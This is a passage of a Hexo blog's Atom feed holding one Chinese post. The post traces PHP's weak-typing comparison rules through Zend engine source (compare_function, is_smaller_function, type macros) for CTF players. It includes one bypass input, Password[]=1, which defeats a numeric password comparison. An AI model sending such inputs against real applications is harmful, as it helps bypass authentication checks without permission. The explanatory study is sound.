<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>LJH&#39;s blog</title>
  
  <subtitle>LJHX&#39;s blog</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://museljh.github.io/"/>
  <updated>2019-03-04T15:03:56.759Z</updated>
  <id>https://museljh.github.io/</id>
  
  <author>
    <name>LJH&#39;s blog</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>记一次深入理解PHP弱类型原理的经历并以此第一次深入了解PHP内核</title>
    <link href="https://museljh.github.io/2019/03/04/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%BC%B1%E7%B1%BB%E5%9E%8B%E5%8E%9F%E7%90%86%E7%9A%84%E7%BB%8F%E5%8E%86%E5%B9%B6%E4%BB%A5%E6%AD%A4%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3PHP%E5%86%85%E6%A0%B8/"/>
    <id>https://museljh.github.io/2019/03/04/记一次深入理解PHP弱类型原理的经历并以此第一次深入了解PHP内核/</id>
    <published>2019-03-04T14:44:50.000Z</published>
    <updated>2019-03-04T15:03:56.759Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/fly.png" alt=""></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在CTF比赛中PHP弱类型的特性常常被用上，但我们往往知其然不知其所以然，究竟为什么PHP是弱类型呢？很少人深究。在这次源码分析的过程中我收获很大，第一次学会了如何深入理解一个问题，虽然花费了我很多时间，但这可以说是一段非常值得的经历。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>首先引入一个问题，为什么以下结果是恒为真的呢？<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var_dump([]&gt;1);</span><br><span class="line">var_dump([]&gt;0);</span><br><span class="line">var_dump([]&gt;-1);</span><br></pre></td></tr></table></figure></p><p>当然实际ctf中问题可能会如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_GET[Password]&gt;99999;</span><br></pre></td></tr></table></figure></p><p>当传入Password[]=1<br>时侯恒为真<br>当然再换一种形式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump([[]]&gt;[1]);</span><br></pre></td></tr></table></figure></p><p>依旧是恒为真<br>对于这类问题，很多人都是认为PHP因为它是弱类型语言它就有这种特性<br>那么为什么PHP会有这种特性呢？<br>我们首先查阅下PHP手册<br><a href="http://php.net/manual/en/language.operators.comparison.php#language.operators.comparison.types" target="_blank" rel="noopener">Comparison Operators</a><br><img src="https://i.imgur.com/RuQpofN.png" alt=""><br>在手册中写到，当array和anything进行比较的时候array is always greater<br>这是一种PHP的定义。<br>那么究竟PHP到底在哪定义了这种特点呢？<br>我们依旧不知道。<br>我们再抛出个问题究竟什么是PHP弱类型呢？<br>很多人可能会回答弱类型就是弱类型，当传入Password[]=1就会绕过这就是弱类型<br>这种回答肯定是不妥当的<br>具体弱类型定义</p><blockquote><p>PHP是弱类型语言，不需要明确的定义变量的类型，变量的类型根据使用时的上下文所决定，也就是变量会根据不同表达式所需要的类型自动转换，比如求和，PHP会将两个相加的值转为long、double再进行加和。每种类型转为另外一种类型都有固定的规则，当某个操作发现类型不符时就会按照这个规则进行转换，这个规则正是弱类型实现的基础。</p></blockquote><p>我们再通过查阅PHP源码来深刻理解PHP弱类型的特点<br>PHP是开源的一种语言，我们在Github上可以很容易的查询到它的源码<br><a href="https://github.com/php/php-src/blob/master/Zend/zend_operators.h" target="_blank" rel="noopener">传送门</a><br>这里找函数会方便点<br>当然解释下什么是Zend</p><blockquote><p>Zend是PHP语言实现的最为重要的部分，是PHP最基础、最核心的部分，它的源码在/Zend目录下，PHP代码从编译到执行都是由Zend完成的</p></blockquote><p>至于为什么要查询zend_operators.h这个文件，operator操作符，其他几个文件不像存在比较函数，有的时候查源码时候就是需要靠感觉，这种大项目 函数变量什么的都有规范 一般所见即所得 看懂英语就大概猜得到用途的，<br>当然这个文件也不一般<br>我再进行解释下,当然想深入理解可以看<a href="http://wiki.jikexueyuan.com/project/extending-embedding-php/2.1.html" target="_blank" rel="noopener">这里</a></p><blockquote><p>PHP在内核中是通过zval这个结构体来存储变量的，它的定义在Zend/zend.h文件里，简短精炼，只有四个成员组成：</p></blockquote><p>我们定位到函数</p><blockquote><p>ZEND_API int ZEND_FASTCALL is_smaller_function(zval <em>result, zval </em>op1, zval *op2);</p></blockquote><p>这里传入了两个值op1,op2,传出一个result<br>解释下zval类型</p><blockquote><p>zval以一个P结尾的宏的参数大多是*zval型变量。 此外获取变量类型的宏还有两个，分别是Z_TYPE和Z_TYPE_PP，前者的参数是zval型，而后者的参数则是**zval。</p></blockquote><p>这样说可能会有些抽象<br>我们换种方式解释，当再php源码中要想判断一个变量的类型最直接的方式，比如想判断这个变量是否为空<br>变量-&gt;type == IS_NULL</p><p>这种方法虽然是正确的，但PHP官网并不建议这么做，PHP中定义了大量的宏，供我们检测、操作变量使用<br>解释下什么是宏</p><blockquote><p>C语言中允许用一个标识符来标识一个字符串，称为“宏”；标识符为“宏名”。在编译预处理时，对程序中所有出现的“宏名”，都用宏定义时的字符串去代换，简称“宏代换”或“宏展开”。一般形式：#define 宏名 字符串</p></blockquote><p>宏定义说明及注意：</p><blockquote><p>宏定义时用宏名来表示一个字符串，在宏展开时又以该字符串替换了宏名，这只是一个简单的替换；<br>宏定义不需要再行末加分号，若加上分号，则会连分号也会被替换的；<br>宏定义必须在函数外面；宏定义的作用域：从定义命令至程序结束，若想终止宏的作用域，则使用undef命令；<br>宏名在程序中用引号括起来，则预处理程序对其不进行宏替换；<br>宏定义是可以嵌套使用的，在展开时，由预处理程序层层替换；<br>建议在进行宏定义时，尽量使用大写字母表示宏名；<br>可用宏来表示数据类型，使书写方便；<br>对“输出格式”做用定义，可以减少书写麻烦。</p></blockquote><p>PHP建议使用的形式<br>Z_TYPE_P(变量) == IS_NULL</p><blockquote><p>以一个P结尾的宏的参数大多是*zval型变量。 此外获取变量类型的宏还有两个，分别是Z_TYPE和Z_TYPE_PP，前者的参数是zval型，而后者的参数则是**zval</p></blockquote><p>这样我们便可以猜测一下php内核是如何实现gettype这个函数了，代码如下：想要详细了解的可以看<a href="http://wiki.jikexueyuan.com/project/extending-embedding-php/2.1.html" target="_blank" rel="noopener">这里</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">//开始定义php语言中的函数gettype</span><br><span class="line">PHP_FUNCTION(gettype)</span><br><span class="line">&#123;</span><br><span class="line">    //arg间接指向调用gettype函数时所传递的参数。是一个zval**结构</span><br><span class="line">    //所以我们要对他使用__PP后缀的宏。</span><br><span class="line">    zval **arg;</span><br><span class="line"></span><br><span class="line">    //这个if的操作主要是让arg指向参数～</span><br><span class="line">    if (zend_parse_parameters(ZEND_NUM_ARGS() TSRMLS_CC, &quot;Z&quot;, &amp;arg) == FAILURE) &#123;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //调用Z_TYPE_PP宏来获取arg指向zval的类型。</span><br><span class="line">    //然后是一个switch结构，RETVAL_STRING宏代表这gettype函数返回的字符串类型的值</span><br><span class="line">    switch (Z_TYPE_PP(arg)) &#123;</span><br><span class="line">        case IS_NULL:</span><br><span class="line">            RETVAL_STRING(&quot;NULL&quot;, 1);</span><br><span class="line">            break;</span><br><span class="line"></span><br><span class="line">        case IS_BOOL:</span><br><span class="line">            RETVAL_STRING(&quot;boolean&quot;, 1);</span><br><span class="line">            break;</span><br><span class="line"></span><br><span class="line">        case IS_LONG:</span><br><span class="line">            RETVAL_STRING(&quot;integer&quot;, 1);</span><br><span class="line">            break;</span><br><span class="line"></span><br><span class="line">        case IS_DOUBLE:</span><br><span class="line">            RETVAL_STRING(&quot;double&quot;, 1);</span><br><span class="line">            break;</span><br><span class="line"></span><br><span class="line">        case IS_STRING:</span><br><span class="line">            RETVAL_STRING(&quot;string&quot;, 1);</span><br><span class="line">            break;</span><br><span class="line"></span><br><span class="line">        case IS_ARRAY:</span><br><span class="line">            RETVAL_STRING(&quot;array&quot;, 1);</span><br><span class="line">            break;</span><br><span class="line"></span><br><span class="line">        case IS_OBJECT:</span><br><span class="line">            RETVAL_STRING(&quot;object&quot;, 1);</span><br><span class="line">            break;</span><br><span class="line"></span><br><span class="line">        case IS_RESOURCE:</span><br><span class="line">            &#123;</span><br><span class="line">                char *type_name;</span><br><span class="line">                type_name = zend_rsrc_list_get_rsrc_type(Z_LVAL_PP(arg) TSRMLS_CC);</span><br><span class="line">                if (type_name) &#123;</span><br><span class="line">                    RETVAL_STRING(&quot;resource&quot;, 1);</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        default:</span><br><span class="line">            RETVAL_STRING(&quot;unknown type&quot;, 1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>以上三个宏的定义在Zend/zend_operators.h里，定义分别是：</p><blockquote><p>#define Z_TYPE(zval)        (zval).type</p></blockquote><p>#define Z_TYPE_P(zval_p)    Z_TYPE(*zval_p)</p><p>#define Z_TYPE_PP(zval_pp)  Z_TYPE(**zval_pp)</p><p>这也是为是什么在Zend/zend_operators.h里面进行查询的原因，貌似有些跑题了？</p><p>当然下一个问题，为什么我们要定位到函数is_smaller_function<br>这里主要是靠对于PHP源码的熟悉，进行猜测，当然有的时候分析源码的时候可以讲PHP源码下载下载，部分IDE会有提供函数来源的功能<br>其实本来有个</p><blockquote><p>   lxr.php.net</p></blockquote><p>可以让我们迅速定位到我们想要的函数，但是这个网站在16年后就不是很稳定了，甚至有人将它当做一个BUG提交给PHP官网，这是一个很有趣的事情，具体可以了解<a href="https://bugs.php.net/bug.php?id=72396" target="_blank" rel="noopener">这里</a><br>那么我们还有没有什么办法迅速定位到我们需要的函数呢？</p><p>进入is_smaller_function的函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ZEND_API int ZEND_FASTCALL is_smaller_function(zval *result, zval *op1, zval *op2) /* &#123;&#123;&#123; */</span><br><span class="line">&#123;</span><br><span class="line">if (compare_function(result, op1, op2) == FAILURE) &#123;</span><br><span class="line">return FAILURE;</span><br><span class="line">&#125;</span><br><span class="line">ZVAL_BOOL(result, (Z_LVAL_P(result) &lt; 0));</span><br><span class="line">return SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这里有一个compare_function函数以及<br>ZVAL_BOOL<br>我们先分析下compare_function函数<br>跟进<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br></pre></td><td class="code"><pre><span class="line">ZEND_API int ZEND_FASTCALL compare_function(zval *result, zval *op1, zval *op2) /* &#123;&#123;&#123; */</span><br><span class="line">&#123;</span><br><span class="line">int ret;</span><br><span class="line">int converted = 0;</span><br><span class="line">zval op1_copy, op2_copy;</span><br><span class="line">zval *op_free, tmp_free;</span><br><span class="line"></span><br><span class="line">while (1) &#123;</span><br><span class="line">switch (TYPE_PAIR(Z_TYPE_P(op1), Z_TYPE_P(op2))) &#123;</span><br><span class="line">case TYPE_PAIR(IS_LONG, IS_LONG):</span><br><span class="line">ZVAL_LONG(result, Z_LVAL_P(op1)&gt;Z_LVAL_P(op2)?1:(Z_LVAL_P(op1)&lt;Z_LVAL_P(op2)?-1:0));</span><br><span class="line">return SUCCESS;</span><br><span class="line"></span><br><span class="line">case TYPE_PAIR(IS_DOUBLE, IS_LONG):</span><br><span class="line">Z_DVAL_P(result) = Z_DVAL_P(op1) - (double)Z_LVAL_P(op2);</span><br><span class="line">ZVAL_LONG(result, ZEND_NORMALIZE_BOOL(Z_DVAL_P(result)));</span><br><span class="line">return SUCCESS;</span><br><span class="line"></span><br><span class="line">case TYPE_PAIR(IS_LONG, IS_DOUBLE):</span><br><span class="line">Z_DVAL_P(result) = (double)Z_LVAL_P(op1) - Z_DVAL_P(op2);</span><br><span class="line">ZVAL_LONG(result, ZEND_NORMALIZE_BOOL(Z_DVAL_P(result)));</span><br><span class="line">return SUCCESS;</span><br><span class="line"></span><br><span class="line">case TYPE_PAIR(IS_DOUBLE, IS_DOUBLE):</span><br><span class="line">if (Z_DVAL_P(op1) == Z_DVAL_P(op2)) &#123;</span><br><span class="line">ZVAL_LONG(result, 0);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">Z_DVAL_P(result) = Z_DVAL_P(op1) - Z_DVAL_P(op2);</span><br><span class="line">ZVAL_LONG(result, ZEND_NORMALIZE_BOOL(Z_DVAL_P(result)));</span><br><span class="line">&#125;</span><br><span class="line">return SUCCESS;</span><br><span class="line"></span><br><span class="line">case TYPE_PAIR(IS_ARRAY, IS_ARRAY):</span><br><span class="line">ZVAL_LONG(result, zend_compare_arrays(op1, op2));</span><br><span class="line">return SUCCESS;</span><br><span class="line"></span><br><span class="line">case TYPE_PAIR(IS_NULL, IS_NULL):</span><br><span class="line">case TYPE_PAIR(IS_NULL, IS_FALSE):</span><br><span class="line">case TYPE_PAIR(IS_FALSE, IS_NULL):</span><br><span class="line">case TYPE_PAIR(IS_FALSE, IS_FALSE):</span><br><span class="line">case TYPE_PAIR(IS_TRUE, IS_TRUE):</span><br><span class="line">ZVAL_LONG(result, 0);</span><br><span class="line">return SUCCESS;</span><br><span class="line"></span><br><span class="line">case TYPE_PAIR(IS_NULL, IS_TRUE):</span><br><span class="line">ZVAL_LONG(result, -1);</span><br><span class="line">return SUCCESS;</span><br><span class="line"></span><br><span class="line">case TYPE_PAIR(IS_TRUE, IS_NULL):</span><br><span class="line">ZVAL_LONG(result, 1);</span><br><span class="line">return SUCCESS;</span><br><span class="line"></span><br><span class="line">case TYPE_PAIR(IS_STRING, IS_STRING):</span><br><span class="line">if (Z_STR_P(op1) == Z_STR_P(op2)) &#123;</span><br><span class="line">ZVAL_LONG(result, 0);</span><br><span class="line">return SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line">ZVAL_LONG(result, zendi_smart_strcmp(Z_STR_P(op1), Z_STR_P(op2)));</span><br><span class="line">return SUCCESS;</span><br><span class="line"></span><br><span class="line">case TYPE_PAIR(IS_NULL, IS_STRING):</span><br><span class="line">ZVAL_LONG(result, Z_STRLEN_P(op2) == 0 ? 0 : -1);</span><br><span class="line">return SUCCESS;</span><br><span class="line"></span><br><span class="line">case TYPE_PAIR(IS_STRING, IS_NULL):</span><br><span class="line">ZVAL_LONG(result, Z_STRLEN_P(op1) == 0 ? 0 : 1);</span><br><span class="line">return SUCCESS;</span><br><span class="line"></span><br><span class="line">case TYPE_PAIR(IS_OBJECT, IS_NULL):</span><br><span class="line">ZVAL_LONG(result, 1);</span><br><span class="line">return SUCCESS;</span><br><span class="line"></span><br><span class="line">case TYPE_PAIR(IS_NULL, IS_OBJECT):</span><br><span class="line">ZVAL_LONG(result, -1);</span><br><span class="line">return SUCCESS;</span><br><span class="line"></span><br><span class="line">default:</span><br><span class="line">if (Z_ISREF_P(op1)) &#123;</span><br><span class="line">op1 = Z_REFVAL_P(op1);</span><br><span class="line">continue;</span><br><span class="line">&#125; else if (Z_ISREF_P(op2)) &#123;</span><br><span class="line">op2 = Z_REFVAL_P(op2);</span><br><span class="line">continue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (Z_TYPE_P(op1) == IS_OBJECT &amp;&amp; Z_OBJ_HANDLER_P(op1, compare)) &#123;</span><br><span class="line">ret = Z_OBJ_HANDLER_P(op1, compare)(result, op1, op2);</span><br><span class="line">if (UNEXPECTED(Z_TYPE_P(result) != IS_LONG)) &#123;</span><br><span class="line">convert_compare_result_to_long(result);</span><br><span class="line">&#125;</span><br><span class="line">return ret;</span><br><span class="line">&#125; else if (Z_TYPE_P(op2) == IS_OBJECT &amp;&amp; Z_OBJ_HANDLER_P(op2, compare)) &#123;</span><br><span class="line">ret = Z_OBJ_HANDLER_P(op2, compare)(result, op1, op2);</span><br><span class="line">if (UNEXPECTED(Z_TYPE_P(result) != IS_LONG)) &#123;</span><br><span class="line">convert_compare_result_to_long(result);</span><br><span class="line">&#125;</span><br><span class="line">return ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (Z_TYPE_P(op1) == IS_OBJECT &amp;&amp; Z_TYPE_P(op2) == IS_OBJECT) &#123;</span><br><span class="line">if (Z_OBJ_P(op1) == Z_OBJ_P(op2)) &#123;</span><br><span class="line">/* object handles are identical, apparently this is the same object */</span><br><span class="line">ZVAL_LONG(result, 0);</span><br><span class="line">return SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line">if (Z_OBJ_HANDLER_P(op1, compare_objects) == Z_OBJ_HANDLER_P(op2, compare_objects)) &#123;</span><br><span class="line">ZVAL_LONG(result, Z_OBJ_HANDLER_P(op1, compare_objects)(op1, op2));</span><br><span class="line">return SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">if (Z_TYPE_P(op1) == IS_OBJECT) &#123;</span><br><span class="line">if (Z_OBJ_HT_P(op1)-&gt;get) &#123;</span><br><span class="line">zval rv;</span><br><span class="line">op_free = Z_OBJ_HT_P(op1)-&gt;get(Z_OBJ_P(op1), &amp;rv);</span><br><span class="line">ret = compare_function(result, op_free, op2);</span><br><span class="line">zend_free_obj_get_result(op_free);</span><br><span class="line">return ret;</span><br><span class="line">&#125; else if (Z_TYPE_P(op2) != IS_OBJECT &amp;&amp; Z_OBJ_HT_P(op1)-&gt;cast_object) &#123;</span><br><span class="line">ZVAL_UNDEF(&amp;tmp_free);</span><br><span class="line">if (Z_OBJ_HT_P(op1)-&gt;cast_object(Z_OBJ_P(op1), &amp;tmp_free, ((Z_TYPE_P(op2) == IS_FALSE || Z_TYPE_P(op2) == IS_TRUE) ? _IS_BOOL : Z_TYPE_P(op2))) == FAILURE) &#123;</span><br><span class="line">ZVAL_LONG(result, 1);</span><br><span class="line">zend_free_obj_get_result(&amp;tmp_free);</span><br><span class="line">return SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line">ret = compare_function(result, &amp;tmp_free, op2);</span><br><span class="line">zend_free_obj_get_result(&amp;tmp_free);</span><br><span class="line">return ret;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">if (Z_TYPE_P(op2) == IS_OBJECT) &#123;</span><br><span class="line">if (Z_OBJ_HT_P(op2)-&gt;get) &#123;</span><br><span class="line">zval rv;</span><br><span class="line">op_free = Z_OBJ_HT_P(op2)-&gt;get(Z_OBJ_P(op2), &amp;rv);</span><br><span class="line">ret = compare_function(result, op1, op_free);</span><br><span class="line">zend_free_obj_get_result(op_free);</span><br><span class="line">return ret;</span><br><span class="line">&#125; else if (Z_TYPE_P(op1) != IS_OBJECT &amp;&amp; Z_OBJ_HT_P(op2)-&gt;cast_object) &#123;</span><br><span class="line">ZVAL_UNDEF(&amp;tmp_free);</span><br><span class="line">if (Z_OBJ_HT_P(op2)-&gt;cast_object(Z_OBJ_P(op2), &amp;tmp_free, ((Z_TYPE_P(op1) == IS_FALSE || Z_TYPE_P(op1) == IS_TRUE) ? _IS_BOOL : Z_TYPE_P(op1))) == FAILURE) &#123;</span><br><span class="line">ZVAL_LONG(result, -1);</span><br><span class="line">zend_free_obj_get_result(&amp;tmp_free);</span><br><span class="line">return SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line">ret = compare_function(result, op1, &amp;tmp_free);</span><br><span class="line">zend_free_obj_get_result(&amp;tmp_free);</span><br><span class="line">return ret;</span><br><span class="line">&#125; else if (Z_TYPE_P(op1) == IS_OBJECT) &#123;</span><br><span class="line">ZVAL_LONG(result, 1);</span><br><span class="line">return SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">if (!converted) &#123;</span><br><span class="line">if (Z_TYPE_P(op1) &lt; IS_TRUE) &#123;</span><br><span class="line">ZVAL_LONG(result, zval_is_true(op2) ? -1 : 0);</span><br><span class="line">return SUCCESS;</span><br><span class="line">&#125; else if (Z_TYPE_P(op1) == IS_TRUE) &#123;</span><br><span class="line">ZVAL_LONG(result, zval_is_true(op2) ? 0 : 1);</span><br><span class="line">return SUCCESS;</span><br><span class="line">&#125; else if (Z_TYPE_P(op2) &lt; IS_TRUE) &#123;</span><br><span class="line">ZVAL_LONG(result, zval_is_true(op1) ? 1 : 0);</span><br><span class="line">return SUCCESS;</span><br><span class="line">&#125; else if (Z_TYPE_P(op2) == IS_TRUE) &#123;</span><br><span class="line">ZVAL_LONG(result, zval_is_true(op1) ? 0 : -1);</span><br><span class="line">return SUCCESS;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">op1 = zendi_convert_scalar_to_number(op1, &amp;op1_copy, result, 1);</span><br><span class="line">op2 = zendi_convert_scalar_to_number(op2, &amp;op2_copy, result, 1);</span><br><span class="line">if (EG(exception)) &#123;</span><br><span class="line">if (result != op1) &#123;</span><br><span class="line">ZVAL_UNDEF(result);</span><br><span class="line">&#125;</span><br><span class="line">return FAILURE;</span><br><span class="line">&#125;</span><br><span class="line">converted = 1;</span><br><span class="line">&#125;</span><br><span class="line">&#125; else if (Z_TYPE_P(op1)==IS_ARRAY) &#123;</span><br><span class="line">ZVAL_LONG(result, 1);</span><br><span class="line">return SUCCESS;</span><br><span class="line">&#125; else if (Z_TYPE_P(op2)==IS_ARRAY) &#123;</span><br><span class="line">ZVAL_LONG(result, -1);</span><br><span class="line">return SUCCESS;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">ZEND_ASSERT(0);</span><br><span class="line">zend_throw_error(NULL, &quot;Unsupported operand types&quot;);</span><br><span class="line">if (result != op1) &#123;</span><br><span class="line">ZVAL_UNDEF(result);</span><br><span class="line">&#125;</span><br><span class="line">return FAILURE;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">/* &#125;&#125;&#125; */</span><br></pre></td></tr></table></figure></p><p>有点长，想要仔细了解的可以详细看<br>讲解下<br>首先<br><img src="https://i.imgur.com/EM4vsEN.png" alt=""><br>这个先等下说<br><img src="https://i.imgur.com/gMWqzae.png" alt=""><br>这里进行swich 判断op1 与 op2 的类型<br>这里我们先拿第一句进行分析<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">case TYPE_PAIR(IS_LONG, IS_LONG):</span><br><span class="line">ZVAL_LONG(result, Z_LVAL_P(op1)&gt;Z_LVAL_P(op2)?1:(Z_LVAL_P(op1)&lt;Z_LVAL_P(op2)?-1:0));</span><br><span class="line">return SUCCESS;</span><br></pre></td></tr></table></figure></p><p>这里op1与op2都是IS_LONG类型<br>PHP中一共如下八种数据类型，具体想了解可以点<a href="http://wiki.jikexueyuan.com/project/extending-embedding-php/2.1.html" target="_blank" rel="noopener"></a><br><img src="https://i.imgur.com/tFGcobN.png" alt=""><br><img src="https://i.imgur.com/4N2WHJq.png" alt=""><br>所以IS_LONG是一种PHP种的整型。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZVAL_LONG(result, Z_LVAL_P(op1)&gt;Z_LVAL_P(op2)?1:(Z_LVAL_P(op1)&lt;Z_LVAL_P(op2)?-1:0));</span><br></pre></td></tr></table></figure></p><p>这句的意思是进行比较OP1，OP2的大小分别返回-1，0，1到result，<br><img src="https://i.imgur.com/AXhqNdV.png" alt=""><br>这里的result是有作用的，<br><img src="https://i.imgur.com/9IXloG3.png" alt=""><br>这里有一个ZVAL_BOOL函数进行判断，用于设置布尔值的zval ，ZVAL_BOOL就是定义这个zval的类型为bool。<br><figure class="highlight plain"><table><tr><td 